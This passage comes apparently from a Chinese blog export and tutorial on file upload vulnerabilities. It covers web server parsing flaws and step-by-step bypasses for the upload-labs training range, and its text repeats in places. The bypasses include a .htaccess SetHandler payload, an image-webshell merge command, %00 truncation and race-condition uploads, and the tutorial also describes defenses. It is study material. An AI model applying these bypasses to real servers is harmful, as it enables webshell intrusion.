src=\"/2019/03/05/文件上传漏洞/1544954489_5c16227975735.png\" alt></p>\n<h3 id=\"0x01-Apache解析漏洞\"><a href=\"#0x01-Apache解析漏洞\" class=\"headerlink\" title=\"0x01 Apache解析漏洞\"></a>0x01 Apache解析漏洞</h3><p><strong>Apache 1.x、2.x：</strong></p>\n<ul>\n<li>Apache对文件名的解析是从后往前的，直到遇到可识别的文件后缀为止。</li>\n<li>Apache可识别的文件后缀（类型）定义在<code>mime.types</code>文件中。</li>\n</ul>\n<blockquote>\n<p>例如文件名：<code>shell.php.rar.rar.rar</code>，Apache由于无法识别<code>.rar</code>，会从后往前一直寻找可识别的文件类型，最后会将其作为<code>.php</code>文件。</p>\n</blockquote>\n<h3 id=\"0x02-Nginx解析漏洞\"><a href=\"#0x02-Nginx解析漏洞\" class=\"headerlink\" title=\"0x02 Nginx解析漏洞\"></a>0x02 Nginx解析漏洞</h3><p><strong>1.漏洞外在表现：</strong></p>\n<ul>\n<li>访问：<code>http://xx.com/x.jpg/y.php</code>，<code>x.jpg</code>会被作为php文件执行。注意<code>y.php</code>是实际不存在的。</li>\n</ul>\n<p><strong>2.漏洞原理：</strong></p>\n<ul>\n<li>严格来说这并不是Nginx的漏洞，Nginx通常是以fastcgi的方式支持PHP解析的，nginx作为代理把HTTP请求转发给fastcgi Server。</li>\n<li>在nginx配置文件中通过正则匹配设置<code>SCRIPT_FILENAME</code>。当访问<code>http://xx.com/shell.jpg/test.php</code>这个URL时，<code>$fastcgi_script_name</code>会被设置为<code>shell.jpg/test.php</code>，然后将构造好的<code>SCRIPT_FILENAME</code>传递给cgi Server。</li>\n<li>当php开启<code>cgi.fix_pathinfo</code>这个选项时（默认开启），那么就会触发在PHP中的如下逻辑：<ul>\n<li>PHP会认为<code>SCRIPT_FILENAME</code>是<code>shell.jpg</code>，而<code>test.php</code>是<code>PATH_INFO</code>，所以就会将<code>shell.jpg</code>作为PHP文件来解析了。</li>\n</ul>\n</li>\n<li>因此这实际不是nginx的漏洞，在使用fastcgi的其他环境下，PHP也存在相同问题，IIS7.0/7.5就是这样的。</li>\n</ul>\n<p><strong>3.漏洞修复：</strong></p>\n<ul>\n<li>修改<code>php.ini</code>文件，将<code>cgi.fix_pathinfo</code>的值设置为0;</li>\n</ul>\n<h2 id=\"三、文件上传过滤与绕过\"><a href=\"#三、文件上传过滤与绕过\" class=\"headerlink\" title=\"三、文件上传过滤与绕过\"></a>三、文件上传过滤与绕过</h2><p><img src=\"/2019/03/05/文件上传漏洞/20180712092548-81b98800-85-1.png\" alt></p>\n<p>结合<code>upload-labs</code>文件上传漏洞靶场进行分析学习。</p>\n<p>靶场地址：<code>https://github.com/c0ny1/upload-labs</code></p>\n<h3 id=\"0x00-前端过滤与绕过（Pass-01）\"><a href=\"#0x00-前端过滤与绕过（Pass-01）\" class=\"headerlink\" title=\"0x00 前端过滤与绕过（Pass-01）\"></a>0x00 前端过滤与绕过（Pass-01）</h3><p><strong><em>过滤:</em></strong></p>\n<p>前端使用JS对上传的文件后缀进行限制。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305144900.png\" alt></p>\n<p><strong><em>绕过:</em></strong></p>\n<p>禁用浏览器Javascript。</p>\n<p>或者使用Burpsuite抓包修改文件名的方式。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305145812.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305150014.png\" alt></p>\n<h3 id=\"0x01-后端过滤与绕过\"><a href=\"#0x01-后端过滤与绕过\" class=\"headerlink\" title=\"0x01 后端过滤与绕过\"></a>0x01 后端过滤与绕过</h3><p><strong>1.Mime类型过滤：Content-Type （Pass-02）</strong></p>\n<p><strong><em>过滤代码：</em></strong>只允许上传特定mime类型的文件。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305150607.png\" alt></p>\n<p><strong><em>Mime类型过滤绕过：</em></strong></p>\n<p>抓包修改Content-Type为允许的类型即可。实际情况中不知允许mime的类型，可以使用Burp进行枚举。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305151049.png\" alt></p>\n<p><strong>2.黑名单过滤之过滤不全 (Pass-03)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305151732.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>被过滤的后缀很少时可以尝试使用其他未加入黑名单且可以被解析的文件后缀。如：<code>.php3</code>、<code>.php4</code>、<code>.phtml</code>等后缀。</p>\n<p><strong>3.黑名单过滤之未过滤.htaccess （Pass-04）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305161438.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>可以发现大部分文件后缀被过滤，但<code>.htaccess</code>未被过滤时，可以上传一个<code>.htaccess</code>文件，文件内容：</p>\n<blockquote>\n<p><code>SetHandler application/x-httpd-php</code></p>\n</blockquote>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305154725.png\" alt></p>\n<p>上传这样的<code>.htaccess</code>文件后，所有文件都会被解析为php，然后再上传图片马，图片会被解析为php文件执行，就可以绕过过滤实现攻击。</p>\n<p>DOS下图片马制作：</p>\n<blockquote>\n<p><strong><code>copy /b a.png + /a b.php  c.png</code></strong></p>\n<blockquote>\n<ul>\n<li><code>/b</code>表示a.png是二进制文件，以二进制方式合并文件。</li>\n<li><code>/a</code>表示b.php是ASCII文件。（该参数可以省略）</li>\n<li><code>c.png</code>是合并后得到的文件。</li>\n</ul>\n</blockquote>\n</blockquote>\n<p>上传图片马并访问：</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305160625.png\" alt></p>\n<blockquote>\n<p>PS:<code>.htacess</code>该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。<code>.htaccess</code>文件(或者”分布式配置文件”），提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。</p>\n</blockquote>\n<p><strong>4.黑名单过滤之未统一大小写 （Pass-05）</strong></p>\n<p><strong><em>过滤代码：</em></strong><code>strtolower()</code>字符串函数会将字符串的所有字符变为小写。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305163146.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>由于未统一大小写，导致过滤不全，可尝试<code>.PhP</code>、<code>.pHP</code>等后缀的方式绕过。</p>\n<p><strong>5.黑名单过滤之未去除空白 （Pass-06）</strong></p>\n<p><strong><em>过滤代码：</em></strong><code>trim()</code>字符串函数会将字符串首尾的空白去除。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305163603.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>在文件后缀前或者后面加入空白。</p>\n<p><strong>6.黑名单过滤之未去除”.” （Pass-07）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305164357.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>利用windows特性，会自动去掉后缀名中最后的<code>.</code>，可在后缀名中加<code>.</code>绕过。</p>\n<p>抓包修改文件名，在文件名最后加入<code>.</code>。</p>\n<p><strong>6.黑名单过滤之未去除”::$DATA” （Pass-08）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305165249.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong><br>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。目的就是不检查后缀名。</p>\n<p>即在文件名之后加<code>::$DATA</code>绕过。</p>\n<p><strong>7.黑名单过滤之文件名拼接 （Pass-09）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306092934.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>抓包修改文件名为：<code>xxxx.php. .</code>(点 空格 点)</p>\n<p><strong>8.黑名单过滤之替换后缀名 (Pass-10)</strong></p>\n<p>过滤代码：<code>str_ireplace(find,replace,string,count)</code>函数替换字符串中的一些字符（不区分大小写）。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306093435.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>使用双写后缀的方式绕过，如使用<code>shell.pphphp</code>，中间的<code>php</code>字符被替换为空后，得到<code>shell.php</code>。</p>\n<p><strong>9.白名单过滤之路径拼接GET (Pass-11)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306094436.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>使用<code>%00</code>截断，<code>%00</code>是URL编码后的空字符，即ASCII码为0的字符（空字符），十六进制表示为<code>0x00</code>，转义字符为<code>\\0</code>，在C、PHP等语言中空字符表示字符串的结束。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图201903061003321.png\" alt></p>\n<blockquote>\n<ul>\n<li>截断条件：<ul>\n<li>php版本小于5.3.4 详情关注CVE-2006-7243</li>\n<li>php的<code>magic_quotes_gpc</code>为OFF状态   //如果不修改将无法上传成功，默认为ON</li>\n</ul>\n</li>\n<li><code>%00</code>截断参考链接：<code>https://www.2cto.com/article/201502/377462.html</code></li>\n</ul>\n</blockquote>\n<p><strong>10.白名单过滤之路径拼接POST （Pass-12）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306102231.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>同样使用<code>%00</code>截断绕过，但是与GET方式不同的是，由于GET提交的数据是在URL中的，因此服务器会对其进行URL decode。而POST提交的是不会进行URL解码的，因此需要在十六进进制中添加<code>0x00</code>。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306103406.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306103855.png\" alt></p>\n<p><strong>11.文件内容过滤之内容匹配 (Pass-13)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306104525.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>使用图片马即可，图片马制作见Pass-04。</p>\n<p><strong>12.文件内容过滤之文件类型 (Pass-14、Pass-15)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><code>getimagesize (string  $filename)</code>返回一个具有四个单元的数组。索引0包含图像宽度的像素值，索引 1 包含图像高度的像素值。索引 2 是图像类型的标记：1 = GIF，2 = JPG，3 = PNG，4 = SWF…</p>\n<p><code>exif_imagetype()</code>读取一个图像的第一个字节并检查其签名。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306105122.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306105746.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>使用图片马进行绕过。</p>\n<p><strong>13.文件内容过滤之二次渲染 (Pass-16)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><code>imagecreatefromjpeg</code>二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306112443.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>绕过方法是将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写脚本程序。</p>\n<p>二次渲染与绕过方法参考连接：<code>https://secgeek.net/bookfresh-vulnerability/</code></p>\n<p><strong>14.条件竞争 （Pass-17）</strong></p>\n<p><strong><em>过滤代码：</em></strong><code>unlink()</code>函数作用是删除文件。若成功，则返回 true，失败则返回 false。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306114556.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>这里注意一个点，不管什么文件都是会被上传到服务器上的，上传到服务器之后才进行白名单检查。</p>\n<p>因此，绕过的思路就是在文件被安全检查删除之前访问文件。</p>\n<p>多个进程并发访问和操作同一数据且执行结果与访问的特定顺序有关，称为竞争条件。</p>\n<p>攻击方法：上传一个php文件，使用Burpsuite进行抓包并将数据包发送到<code>intruder</code>模块，清空变量，然后选择Payload的类型为<code>Null payloads</code>，并输入重放数据包的数量，保证不断在上传文件。同时使用浏览器不断刷新访问上传的php文件，直到访问成功。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306130645.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306131219.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306131709.png\" alt></p>\n<p><strong>参考连接：</strong></p>\n<p><a href=\"https://xz.aliyun.com/t/2435\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/2435</a></p>\n<p><a href=\"https://github.com/LandGrey/upload-labs-writeup\" target=\"_blank\" rel=\"noopener\">https://github.com/LandGrey/upload-labs-writeup</a></p>\n<p><a href=\"http://www.cnblogs.com/shellr00t/p/6426856.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/shellr00t/p/6426856.html</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/164561\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/164561</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><blockquote>\n<p>文件上传漏洞是指用户上传可执行的脚本文件，并通过此脚本获得了执行服务器命令的能力。</p>\n</blockquote>\n<h3 id=\"0x00-漏洞常见危害\"><a href=\"#0x00-漏洞常见危害\" class=\"headerlink\" title=\"0x00 漏洞常见危害\"></a>0x00 漏洞常见危害</h3><ol>\n<li>上传web脚本语言文件，WEB容器解释运行了上传的脚本文件，导致代码执行。</li>\n<li>上传Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域的行为。</li>\n<li>上传病毒、木马文件，并诱骗管理员或用户下载执行。</li>\n<li>上传合法文件，但内容为脚本语言代码，配合文件包含漏洞执行脚本。</li>\n</ol>","more":"<h3 id=\"0x01-攻击条件\"><a href=\"#0x01-攻击条件\" class=\"headerlink\" title=\"0x01 攻击条件\"></a>0x01 攻击条件</h3><ol>\n<li>上传文件后，要能通过WEB访问该文件。（能知道文件的路径并能访问）</li>\n<li>上传的文件能被WEB容器解释执行。</li>\n<li>文件被安全检查、改变内容，如压缩等操作，也会导致攻击不成功。</li>\n</ol>\n<h3 id=\"0x02-安全的上传功能\"><a href=\"#0x02-安全的上传功能\" class=\"headerlink\" title=\"0x02 安全的上传功能\"></a>0x02 安全的上传功能</h3><ol>\n<li>上传目录设置为不可执行。</li>\n<li>判断文件类型，对危险的文件类型进行过滤，且应采用白名单而不是黑名单方式过滤。</li>\n<li>使用随机数重命名上传的文件及改写路径。</li>\n<li>文件服务器使用单独的域名，这样有一些攻击会受到同源策略的影响而导致不生效。（如上传的是crossdomain.xml、XSS利用的Javascript文件等）</li>\n</ol>\n<h3 id=\"0x03-文件上传功能\"><a href=\"#0x03-文件上传功能\" class=\"headerlink\" title=\"0x03 文件上传功能\"></a>0x03 文件上传功能</h3><blockquote>\n<p>文件上传本质上是客户端的 POST 请求，前端上传页面表单处需要指定 enctype 为 multipart/form-data 或者 Multipart/form-data 才能正常上传文件。</p>\n</blockquote>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305132724.png\" alt></p>\n<h2 id=\"二、文件解析漏洞\"><a href=\"#二、文件解析漏洞\" class=\"headerlink\" title=\"二、文件解析漏洞\"></a>二、文件解析漏洞</h2><blockquote>\n<p>解析漏洞是指不同Web容器对文件的解析方式的特性，一些解析特性配合文件上传功能会造成巨大的安全问题。</p>\n</blockquote>\n<h3 id=\"0x00-IIS解析漏洞\"><a href=\"#0x00-IIS解析漏洞\" class=\"headerlink\" title=\"0x00 IIS解析漏洞\"></a>0x00 IIS解析漏洞</h3><p><strong>IIS 6.0解析漏洞</strong></p>\n<p>1.文件名截断，截断字符为分号（;）：</p>\n<ul>\n<li>例如文件名：<code>xx.asp;yy.jpg</code>，会被作为<code>xx.asp</code>。</li>\n</ul>\n<p>2.文件夹扩展名解析漏洞，<code>/*.asp/</code>目录下的所有文件都会被作为asp文件解析。</p>\n<ul>\n<li>例如：<code>/x.asp/y.jpg</code>，<code>y.jpg</code>会被作为asp文件解析。</li>\n</ul>\n<p>3.IIS 6.0除了可以解析执行asp类型文件外，还有三种可执行文件类型：</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; test.asa</span><br><span class=\"line\">&gt; test.cer</span><br><span class=\"line\">&gt; test.cdx</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>IIS PUT漏洞</strong></p>\n<p><code>PUT</code>是在Webdav中定义的一个方法，该方法允许用户上传文件到指定路径下。</p>\n<p>在IIS中，若目录具有<code>写权限</code>且<code>Webdav</code>是开启的，就会支持PUT方法。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/1544954468_5c162264b3e77.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/1544954489_5c16227975735.png\" alt></p>\n<h3 id=\"0x01-Apache解析漏洞\"><a href=\"#0x01-Apache解析漏洞\" class=\"headerlink\" title=\"0x01 Apache解析漏洞\"></a>0x01 Apache解析漏洞</h3><p><strong>Apache 1.x、2.x：</strong></p>\n<ul>\n<li>Apache对文件名的解析是从后往前的，直到遇到可识别的文件后缀为止。</li>\n<li>Apache可识别的文件后缀（类型）定义在<code>mime.types</code>文件中。</li>\n</ul>\n<blockquote>\n<p>例如文件名：<code>shell.php.rar.rar.rar</code>，Apache由于无法识别<code>.rar</code>，会从后往前一直寻找可识别的文件类型，最后会将其作为<code>.php</code>文件。</p>\n</blockquote>\n<h3 id=\"0x02-Nginx解析漏洞\"><a href=\"#0x02-Nginx解析漏洞\" class=\"headerlink\" title=\"0x02 Nginx解析漏洞\"></a>0x02 Nginx解析漏洞</h3><p><strong>1.漏洞外在表现：</strong></p>\n<ul>\n<li>访问：<code>http://xx.com/x.jpg/y.php</code>，<code>x.jpg</code>会被作为php文件执行。注意<code>y.php</code>是实际不存在的。</li>\n</ul>\n<p><strong>2.漏洞原理：</strong></p>\n<ul>\n<li>严格来说这并不是Nginx的漏洞，Nginx通常是以fastcgi的方式支持PHP解析的，nginx作为代理把HTTP请求转发给fastcgi Server。</li>\n<li>在nginx配置文件中通过正则匹配设置<code>SCRIPT_FILENAME</code>。当访问<code>http://xx.com/shell.jpg/test.php</code>这个URL时，<code>$fastcgi_script_name</code>会被设置为<code>shell.jpg/test.php</code>，然后将构造好的<code>SCRIPT_FILENAME</code>传递给cgi Server。</li>\n<li>当php开启<code>cgi.fix_pathinfo</code>这个选项时（默认开启），那么就会触发在PHP中的如下逻辑：<ul>\n<li>PHP会认为<code>SCRIPT_FILENAME</code>是<code>shell.jpg</code>，而<code>test.php</code>是<code>PATH_INFO</code>，所以就会将<code>shell.jpg</code>作为PHP文件来解析了。</li>\n</ul>\n</li>\n<li>因此这实际不是nginx的漏洞，在使用fastcgi的其他环境下，PHP也存在相同问题，IIS7.0/7.5就是这样的。</li>\n</ul>\n<p><strong>3.漏洞修复：</strong></p>\n<ul>\n<li>修改<code>php.ini</code>文件，将<code>cgi.fix_pathinfo</code>的值设置为0;</li>\n</ul>\n<h2 id=\"三、文件上传过滤与绕过\"><a href=\"#三、文件上传过滤与绕过\" class=\"headerlink\" title=\"三、文件上传过滤与绕过\"></a>三、文件上传过滤与绕过</h2><p><img src=\"/2019/03/05/文件上传漏洞/20180712092548-81b98800-85-1.png\" alt></p>\n<p>结合<code>upload-labs</code>文件上传漏洞靶场进行分析学习。</p>\n<p>靶场地址：<code>https://github.com/c0ny1/upload-labs</code></p>\n<h3 id=\"0x00-前端过滤与绕过（Pass-01）\"><a href=\"#0x00-前端过滤与绕过（Pass-01）\" class=\"headerlink\" title=\"0x00 前端过滤与绕过（Pass-01）\"></a>0x00 前端过滤与绕过（Pass-01）</h3><p><strong><em>过滤:</em></strong></p>\n<p>前端使用JS对上传的文件后缀进行限制。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305144900.png\" alt></p>\n<p><strong><em>绕过:</em></strong></p>\n<p>禁用浏览器Javascript。</p>\n<p>或者使用Burpsuite抓包修改文件名的方式。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305145812.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305150014.png\" alt></p>\n<h3 id=\"0x01-后端过滤与绕过\"><a href=\"#0x01-后端过滤与绕过\" class=\"headerlink\" title=\"0x01 后端过滤与绕过\"></a>0x01 后端过滤与绕过</h3><p><strong>1.Mime类型过滤：Content-Type （Pass-02）</strong></p>\n<p><strong><em>过滤代码：</em></strong>只允许上传特定mime类型的文件。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305150607.png\" alt></p>\n<p><strong><em>Mime类型过滤绕过：</em></strong></p>\n<p>抓包修改Content-Type为允许的类型即可。实际情况中不知允许mime的类型，可以使用Burp进行枚举。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305151049.png\" alt></p>\n<p><strong>2.黑名单过滤之过滤不全 (Pass-03)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305151732.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>被过滤的后缀很少时可以尝试使用其他未加入黑名单且可以被解析的文件后缀。如：<code>.php3</code>、<code>.php4</code>、<code>.phtml</code>等后缀。</p>\n<p><strong>3.黑名单过滤之未过滤.htaccess （Pass-04）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305161438.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>可以发现大部分文件后缀被过滤，但<code>.htaccess</code>未被过滤时，可以上传一个<code>.htaccess</code>文件，文件内容：</p>\n<blockquote>\n<p><code>SetHandler application/x-httpd-php</code></p>\n</blockquote>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305154725.png\" alt></p>\n<p>上传这样的<code>.htaccess</code>文件后，所有文件都会被解析为php，然后再上传图片马，图片会被解析为php文件执行，就可以绕过过滤实现攻击。</p>\n<p>DOS下图片马制作：</p>\n<blockquote>\n<p><strong><code>copy /b a.png + /a b.php  c.png</code></strong></p>\n<blockquote>\n<ul>\n<li><code>/b</code>表示a.png是二进制文件，以二进制方式合并文件。</li>\n<li><code>/a</code>表示b.php是ASCII文件。（该参数可以省略）</li>\n<li><code>c.png</code>是合并后得到的文件。</li>\n</ul>\n</blockquote>\n</blockquote>\n<p>上传图片马并访问：</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305160625.png\" alt></p>\n<blockquote>\n<p>PS:<code>.htacess</code>该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。<code>.htaccess</code>文件(或者”分布式配置文件”），提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。</p>\n</blockquote>\n<p><strong>4.黑名单过滤之未统一大小写 （Pass-05）</strong></p>\n<p><strong><em>过滤代码：</em></strong><code>strtolower()</code>字符串函数会将字符串的所有字符变为小写。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305163146.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>由于未统一大小写，导致过滤不全，可尝试<code>.PhP</code>、<code>.pHP</code>等后缀的方式绕过。</p>\n<p><strong>5.黑名单过滤之未去除空白 （Pass-06）</strong></p>\n<p><strong><em>过滤代码：</em></strong><code>trim()</code>字符串函数会将字符串首尾的空白去除。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305163603.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>在文件后缀前或者后面加入空白。</p>\n<p><strong>6.黑名单过滤之未去除”.” （Pass-07）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305164357.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>利用windows特性，会自动去掉后缀名中最后的<code>.</code>，可在后缀名中加<code>.</code>绕过。</p>\n<p>抓包修改文件名，在文件名最后加入<code>.</code>。</p>\n<p><strong>6.黑名单过滤之未去除”::$DATA” （Pass-08）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305165249.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong><br>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。目的就是不检查后缀名。</p>\n<p>即在文件名之后加<code>::$DATA</code>绕过。</p>\n<p><strong>7.黑名单过滤之文件名拼接 （Pass-09）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306092934.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>抓包修改文件名为：<code>xxxx.php. .</code>(点 空格 点)</p>\n<p><strong>8.黑名单过滤之替换后缀名 (Pass-10)</strong></p>\n<p>过滤代码：<code>str_ireplace(find,replace,string,count)</code>函数替换字符串中的一些字符（不区分大小写）。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306093435.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>使用双写后缀的方式绕过，如使用<code>shell.pphphp</code>，中间的<code>php</code>字符被替换为空后，得到<code>shell.php</code>。</p>\n<p><strong>9.白名单过滤之路径拼接GET (Pass-11)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306094436.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>使用<code>%00</code>截断，<code>%00</code>是URL编码后的空字符，即ASCII码为0的字符（空字符），十六进制表示为<code>0x00</code>，转义字符为<code>\\0</code>，在C、PHP等语言中空字符表示字符串的结束。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图201903061003321.png\" alt></p>\n<blockquote>\n<ul>\n<li>截断条件：<ul>\n<li>php版本小于5.3.4 详情关注CVE-2006-7243</li>\n<li>php的<code>magic_quotes_gpc</code>为OFF状态   //如果不修改将无法上传成功，默认为ON</li>\n</ul>\n</li>\n<li><code>%00</code>截断参考链接：<code>https://www.2cto.com/article/201502/377462.html</code></li>\n</ul>\n</blockquote>\n<p><strong>10.白名单过滤之路径拼接POST （Pass-12）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306102231.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>同样使用<code>%00</code>截断绕过，但是与GET方式不同的是，由于GET提交的数据是在URL中的，因此服务器会对其进行URL decode。而POST提交的是不会进行URL解码的，因此需要在十六进进制中添加<code>0x00</code>。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306103406.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306103855.png\" alt></p>\n<p><strong>11.文件内容过滤之内容匹配 (Pass-13)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306104525.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>使用图片马即可，图片马制作见Pass-04。</p>\n<p><strong>12.文件内容过滤之文件类型 (Pass-14、Pass-15)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><code>getimagesize (string  $filename)</code>返回一个具有四个单元的数组。索引0包含图像宽度的像素值，索引 1 包含图像高度的像素值。索引 2 是图像类型的标记：1 = GIF，2 = JPG，3 = PNG，4 = SWF…</p>\n<p><code>exif_imagetype()</code>读取一个图像的第一个字节并检查其签名。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306105122.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306105746.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>使用图片马进行绕过。</p>\n<p><strong>13.文件内容过滤之二次渲染 (Pass-16)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><code>imagecreatefromjpeg</code>二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306112443.png\" 